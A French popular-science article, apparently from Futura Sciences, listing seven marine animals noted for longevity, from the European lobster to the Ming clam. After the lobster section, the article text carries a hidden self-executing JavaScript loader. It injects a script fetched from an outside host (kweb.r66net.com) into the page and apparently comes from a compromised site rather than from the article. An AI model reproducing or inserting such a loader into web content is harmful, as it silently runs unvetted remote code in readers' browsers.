{"title": "Le top 7 de la longevite animale", "newspaper": "Futura Sciences", "author": ["Par Andrea Haug, Futura"], "date_publi": "2015-02-18", "content": "Si l'Homme affiche d'impressionnants records de longevite depassant le siecle, certains animaux marins n'ont rien a lui envier. Souvent de croissance lente, ces animaux vivent parfois dans les profondeurs marines et atteignent des dizaines, voire des centaines d'annees. Voici un echantillon de ces etres surprenants de vitalite. Crustace : 50 ans pour le homard europeen ( Homarus gammarus )  Parce qu'il a ete decouvert au debut du XXe siecle en grande quantite au large de la commune bretonne de Loguivy-de-la-Mer et du fait de sa  couleur  naturelle, le homard europeen  porte  aussi le nom de << Bleu de Loguivy >>. Ce  crustace  effectue pour trouver des partenaires sexuels des migrations encore mal connues. Les femelles portent leurs oeufs onze mois durant avant leur eclosion, puis les  larves  planctoniques se fixent au bout de trois semaines sur le  fond marin . Passes deux ans, les jeunes homards qui ne mesurent que 15 mm optent pour des crevasses en zone rocheuse. Ils deviennent des adultes reproducteurs a 4 ans et mesurent alors de 25 a 50 cm. Leur croissance s'effectue par  mues  successives : la carapace chitineuse se rompt et libere l'animal. Celui-ci se gonfle ensuite d'eau et gagne une taille superieure et ainsi de suite. Ce phenomene ne laisse pas de traces sur l'animal, ce qui rend difficile l'evaluation de son age. Neanmoins, les observations faites en elevage ou lors des campagnes de marquage d'animaux en milieu naturel permettent d'estimer l'age des plus grands animaux a 50 ans et plus.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Poisson : 150 ans pour l'hoplostethe orange ( Hoplostethus atlanticus ) Hoplostethus atlanticus  est appele << poisson-montre >> du fait de sa tete ronde et des canaux muqueux qui irradient de son  oeil  rappelant les rouages d'une montre. L'animal habite les oceans du Globe a des profondeurs comprises entre 900 et 1.800 metres, notamment dans les  canyons sous-marins .  L'hoplostethe orange a surtout ete exploite dans les annees 1970, en particulier en Nouvelle-Zelande et en Australie. Il etait alors commercialise sous le nom d'<< empereur >>. Les stocks de l'epoque ont deja ete decimes et ceux de substitution recemment decouverts s'epuisent rapidement. (c) Pengo, Wikimedia Commons, CC by-sa 3.0                               Lors de la reproduction, il forme de grandes agregations durant lesquelles les males et les femelles liberent leurs  gametes . Les oeufs fecondes, puis les larves developpees, remontent a environ 200 metres de profondeur. Les  alevins  redescendent ensuite dans des eaux plus profondes a mesure qu'ils grandissent. L'espece n'atteint sa maturite sexuelle qu'entre 20 et 30 ans, ce qui pourrait s'expliquer par un taux de predation faible et la rarete des proies dans les  abysses . Les adultes peuvent mesurer 75 cm de long pour un poids de 7  kg  et l'age du plus vieux specimen connu, determine par radiation radiometrique des  isotopes  des  concretions  minerales de ses  oreilles internes , serait de 149 ans. Echinoderme : 200 ans pour l'oursin rouge geant ( Astropyga radiata ) Assez commun dans l'ocean Indien et dans une partie de l'ocean Pacifique, cet echinoderme doit son appellation a sa couleur et a sa taille pouvant atteindre pres de 20 cm de diametre, la plus grande connue parmi les  especes  d'oursins. Les oeufs sont fecondes en pleine eau, puis les larves se fixent apres quelques semaines. Par 30 metres de fond, les juveniles attendent la nuit pour se nourrir, mais les adultes sont visibles le jour dans les herbiers et les etendues sableuses des lagons. Certaines des epines de l'espece mesurent plus de 5 cm et les plus courtes sont  venimeuses , mais sans danger pour l'Homme. L' oursin  rouge geant est notamment capable de les regenerer en cas de cassure. S'il peut vivre une trentaine d'annees, certains individus ont egalement atteint l'age de 200 ans. Souvent rouge sombre, l'espece d'oursin Astropyga radiata presente aussi des teintes de beige, orange, violet et noir. Ses epines regroupees laissent entrevoir des points bleus iridescents tres lumineux. (c) Q. Phia, Wikimedia Commons, CC by-sa 2.0                               Mammifere : 200 ans pour baleine boreale ( Balaena mysticetus ) Vivant dans les eaux  arctiques , la  baleine boreale  est un cetace mesurant jusqu'a 20 metres pour un poids d'une centaine de tonnes. Sa longevite a ete estimee a plus de 200 ans grace a des  cicatrices  laissees par d'anciennes blessures. Cette longevite exceptionnelle pourrait s'expliquer par certains  genes . Par exemple, l'analyse du  genome  de la baleine montre des mutations uniques dans le gene ERCC1 implique dans la reparation de l' ADN  endommage. Un autre gene, appele PCNA et associe a la croissance cellulaire et a la reparation de l'ADN, contient une section d'ADN dupliquee. Cette duplication pourrait ralentir le vieillissement du cetace. Requin : 400 ans pour le requin du Groenland ( Somniosus microcephalus ) Ce  requin  gris, plutot dodu, mesurant cinq metres, vit dans les eaux de l'ocean arctique et serait le champion de la longevite chez les  vertebres . Sa croissance est estimee a environ 1 cm par an.  Dans un article paru dans  Science , une equipe internationale de chercheurs decrit comment ils ont reussi a mesurer l'age de 28 requins du Groenland. Ces animaux ont ete recuperes accidentellement dans des filets de  peche  entre 2010 et 2013 et mesuraient entre 81 et 502 cm. Les chercheurs ont utilise la datation au carbone-14 et tenu compte du fait que des essais nucleaires atmospheriques ont entraine un pic dans l'alimentation marine dans les annees 1960. Les resultats ont revele que le plus grand requin, une femelle de plus de cinq metres de long, avait environ 392 ans, avec une marge d'erreur de plus ou moins 120 ans. La maturite sexuelle des femelles est atteinte lorsqu'elles mesurent une taille de l'ordre de quatre metres, soit a l'age de 150 ans environ.  D'apres une recherche parue en aout 2016, le requin du Groenland serait le vertebre qui vivrait le plus longtemps. (c) Julius Nielsen,  University of Copenhagen                               Cnidaire : l'immortalite (theorique) pour la meduse  Turritopsis nutricula Petite en taille, mais longue en  esperance de vie . La  meduse   Turritopsis nutricula  ne mesure en effet que 5 mm de diametre, mais pourrait vivre  ad vitam aeternam . Originaire de la mer des Caraibes, l'espece est de nos jours tres repandue. Grace a un processus cellulaire particulier appele transdifferenciation, l'animal est capable de stopper son vieillissement et meme de rajeunir. Ce qui en fait un exceptionnel sujet d'etudes pour les biologistes et les geneticiens et un sujet d'interet pour certains groupes pharmaceutiques qui envisagent deja la production d'une creme rajeunissante contenant l'ADN de  Turritopsis .  << C'est comme si un papillon etait capable de retourner en arriere au stade de  chenille  >> , explique Stefano Piraino, professeur a l'universite du Salento, en Italie, et l'un des auteurs du premier article scientifique sur le sujet, disponible sur le site de  The Biological Bulletin . La decouverte de l'extraordinaire faculte biologique s'est faite par hasard : quel ne fut pas l'etonnement d'un etudiant qui avait oublie une  meduse  sur son plan de travail tout un weekend, de retrouver la semaine suivante l'individu sous la forme d'un polype ? Autrement dit, la meduse s'etait metamorphosee en un stade anterieur a celui de sa vie adulte. Pour les scientifiques, le cycle biologique differe dans le sens ou un adulte libere ses gametes qui, fecondes, donnent des oeufs, puis des larves. Elles se posent sur le fond marin pour devenir des polypes qui eux-memes se transformeront en une nouvelle generation de meduses. C'est alors qu'au lieu de mourir, le parent de la nouvelle colonie, dans un but de multiplication, << rajeunit >> lui aussi sur le fond marin en polype. Il bourgeonne par la suite et produit ainsi une nouvelle colonie de...  clones  de lui-meme. Si elle est en apparence biologiquement immortelle, l'espece reste pour autant vulnerable aux maladies, a la predation, a la pollution ou encore aux traumatismes parmi differentes causes possibles de mortalite. Au lieu de mourir, la meduse  Turritopsis nutricula  rajeunit en polype. (c) muzina shanghai, Flickr CC by-nc-sa 2.0                               Mollusque bivalve : 500 ans et plus pour la cyprine ( Arctica islandica ) La << praire d'Islande >> vit, comme son deuxieme nom l'indique, dans les  profondeurs marines  de l'ile de l'Atlantique nord. Des specimens peches et maintenus en captivite ont ete estimes etre ages de plus de 400 ans, selon une etude sclerochronologique, une technique basee sur le nombre de stries de croissance de la  coquille . Les oeufs et les larves sont planctoniques et derivent avec les courants. Puis les larves se metamorphosent en juveniles qui se deposent alors sur les fonds marins, parfois a 500 metres de profondeur. La croissance de l'animal est tres lente avec une taille de 49 mm a l'age de 7 ans. La maturite sexuelle serait en moyenne atteinte vers la douzieme annee d'existence. Un individu, mort en cours d'analyse, affichait meme l'age record de 507 ans. Le  mollusque Ming , l'animal le plus vieux du monde, a ete appele ainsi en reference a la dynastie chinoise qui regnait a sa naissance. Il reste impossible de savoir combien de temps l'animal aurait pu encore vivre en milieu naturel. Interview : quels sont les secrets de la longevite ?                       Les etres vivants ont une esperance de vie limitee et la recherche commence a comprendre quels sont les mecanismes en cause. Mais connaitre ces secrets permettrait-il une vie plus longue ? Futura-Sciences a interviewe Vera Gorbunova, chercheuse en biologie, lors de son allocution a TEDxCannes, afin d'en savoir plus.                                       ", "theme": "planete"}